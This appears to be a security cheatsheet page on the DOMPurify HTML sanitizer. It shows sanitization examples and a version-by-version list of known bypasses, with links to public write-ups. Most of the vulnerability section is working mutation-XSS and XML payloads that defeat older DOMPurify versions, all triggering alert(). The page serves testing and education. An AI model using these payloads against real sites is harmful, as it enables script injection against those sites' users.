---
title: "DOMPurify"
description: "Cheatsheet on DOMPurify"
lead: "Cheatsheet on DOMPurify"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "framework"
weight: 620
toc: true
---

## DOMPurify

[DOMPurify](https://github.com/cure53/DOMPurify) is the leading client-side XSS sanitizer for HTML, MathML and SVG.

Examples of sanitization:

```js
DOMPurify.sanitize('<img src=x onerror=alert(1)//>'); // becomes <img src="x">
DOMPurify.sanitize('<svg><g/onload=alert(2)//<p>'); // becomes <svg><g></g></svg>
DOMPurify.sanitize('<p>abc<iframe//src=jAva&Tab;script:alert(3)>def</p>'); // becomes <p>abc</p>
DOMPurify.sanitize('<math><mi//xlink:href="data:x,<script>alert(4)</script>">'); // becomes <math><mi></mi></math>
DOMPurify.sanitize('<TABLE><tr><td>HELLO</tr></TABL>'); // becomes <table><tbody><tr><td>HELLO</td></tr></tbody></table>
DOMPurify.sanitize('<UL><li><A HREF=//google.com>click</UL>'); // becomes <ul><li><a href="//google.com">click</a></li></ul>
```

## Vulnerabilities

### Version <= 3.0.10 & 3.0.11

- [Bypassing DOMPurify with good old XML](https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/)

```xml
<?xml-stylesheet > <img src=x onerror="alert('DOMPurify bypassed!!!')"> ?>
<?img ><img src onerror=alert(1)>?>
<![CDATA[ ><img src onerror=alert(1)> ]]>
```

### Version <= 3.0.8

- [Playing with DOMPurify custom elements handling](https://mizu.re/post/playing-with-dompurify-ce-handling)

### Version < 2.2.3

- [Testing a more advanced mXSS mitigation strategy for MathML](https://github.com/cure53/DOMPurify/commit/8ab47b0a694022b396e30b7f643e28971f75f5d8)

```html
<math><mtext><h1><a><h6></a></h6><mglyph><svg>
<mtext><style><a title="</style><img src onerror='alert(1)'>"></style></h1>
```

### Version <= 2.2.0

- [Bypass in DOMPurify when sanitizing svg elements](https://hackerone.com/reports/1024734)

```html
<form><math><mtext></form><form><mglyph><svg>
<mtext><style><path id="</style><img onerror=alert(\'XSS\') src>">
```

### Version < 2.1

- [Bypassing DOMPurify again with mutation XSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)

```html
<math><mtext><table><mglyph><style>
<!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
```

```xml
<math><mtext><table><mglyph><style>
<!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
```

### Version < 2.0.17

- [Mutation XSS via namespace confusion](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)

```html
<form>
<math><mtext>
</form><form>
<mglyph>
<style></math><img src onerror=alert(1)>
```

### Version <= 2.0.0

- [Write-up of DOMPurify 2.0.0 bypass using mutation XSS](https://research.securitum.com/dompurify-bypass-using-mxss/)

```html
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```